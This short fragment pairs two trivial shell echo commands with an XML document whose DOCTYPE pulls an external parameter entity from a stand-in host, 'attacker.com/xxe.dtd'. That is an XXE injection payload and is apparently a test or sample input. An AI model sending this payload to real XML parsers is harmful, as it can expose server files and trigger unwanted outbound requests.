echo "Hello"
echo "Done"


<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">
%remote;
]>
<strXML>test</strXML>